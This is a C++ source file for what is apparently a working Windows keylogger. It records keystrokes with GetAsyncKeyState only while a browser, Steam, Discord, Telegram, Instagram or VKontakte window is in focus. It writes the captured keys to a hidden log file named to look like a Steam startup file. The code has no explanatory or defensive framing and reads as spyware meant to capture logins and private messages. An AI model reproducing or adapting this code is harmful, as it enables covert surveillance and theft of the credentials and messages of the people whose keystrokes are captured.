#include "InputHandler.hpp"
#include <time.h>
#include "assert.hpp"
void InputHandler::resetInputArray(bool* array, int size)
{
	for (int i = 0; i < size; i++)array[i] = false;
}
void InputHandler::printToFile(const char* directory)
{
	if (!directory || buffer.empty())return;
	setlocale(LC_ALL, "ru");
	time_t rawtime;
	time(&rawtime);
	int length = 0;
	std::ifstream helpForFindingLength(directory, std::ios::ate | std::ios::in);
	std::ofstream fileOutputHandler;
	length = helpForFindingLength.tellg();
	helpForFindingLength.close();
	if (length > 0) {
		std::ifstream fileOutputHandlerReserve(directory);
		char* _buffer = new char[length];
		ZeroMemory(_buffer, length);
		fileOutputHandlerReserve.read(_buffer, length);
		fileOutputHandlerReserve.close();

		fileOutputHandler.open(directory);
		assert(fileOutputHandler.is_open());
		for (int i = 0; _buffer[i]; i++)
		{
			if (_buffer[i] == VK_MENU)fileOutputHandler << "[ALT]";
			if (_buffer[i] == VK_BACK)fileOutputHandler << "[BSP]";
			if (_buffer[i] == VK_RETURN)fileOutputHandler << "[NL]" << std::endl;
			if (_buffer[i] == 32)fileOutputHandler << "[SP]";
			if (_buffer[i] == VK_TAB)fileOutputHandler << "[TAB]";
			if (_buffer[i] == VK_CAPITAL)fileOutputHandler << "[CAPS]";
			else fileOutputHandler << _buffer[i];
		}
		delete[] _buffer;
	}
	if(!fileOutputHandler.is_open())fileOutputHandler.open(directory);
	fileOutputHandler << "[INPUT DATA:]" << rawtime << std::endl;
	for (int i = 0; buffer[i]; i++)
	{
		if (buffer[i] == VK_MENU)fileOutputHandler << "[ALT]";
		if (buffer[i] == VK_BACK)fileOutputHandler << "[BSP]";
		if (buffer[i] == VK_RETURN)fileOutputHandler << "[NL]" << std::endl;
		if (buffer[i] == 32)fileOutputHandler << "[SP]";
		if (buffer[i] == VK_TAB)fileOutputHandler << "[TAB]";
		if (buffer[i] == VK_CAPITAL)fileOutputHandler << "[CAPS]";
		else fileOutputHandler << buffer[i];
	}
	fileOutputHandler << std::endl;
	fileOutputHandler.close();
	buffer.clear();
}
std::string InputHandler::GetDirectoryToFile()
{
	wchar_t name[128];
	DWORD size = 128;
	GetUserName((LPWSTR)name, &size);
	std::wstring wuser_name = std::wstring(name);
	std::string user_name = std::string(wuser_name.begin(), wuser_name.end());
	std::string AppDataPath = "C:\\Users\\" + user_name + "\\AppData\\Local\\Steam\\Startup.txt";
	return AppDataPath;
}
void InputHandler::AddToBuffer(char value)
{
	setlocale(LC_ALL, "ru");
	buffer += value;
}
void InputHandler::GetPressedChar()
{
	static const char* processList[] = { "Google Chrome", "Steam","Opera","Mozila Firefox", "Steam", "Discord","Telegram","Instagram","¬контакте" };
	WCHAR wWindowText[100];
	std::wstring wWindowTextBuffer;
	HWND hHwnd = GetForegroundWindow();
	GetWindowText(hHwnd, (LPWSTR)&wWindowText, 100);
	wWindowTextBuffer = std::wstring(wWindowText);
	std::string sProcName(wWindowTextBuffer.begin(), wWindowTextBuffer.end());
	bool bBreturn = true;
	for (const char* procName : processList)
	{
		if (strstr(sProcName.c_str(),procName)) {
			bBreturn = false;
		}
	}
	if (bBreturn)return;
	setlocale(LC_ALL, "ru");
	for (short i = 8; i <= 190; i++)
	{
		if (GetAsyncKeyState(i) & 0x01) {
			AddToBuffer((char)i);
		}
	}
}
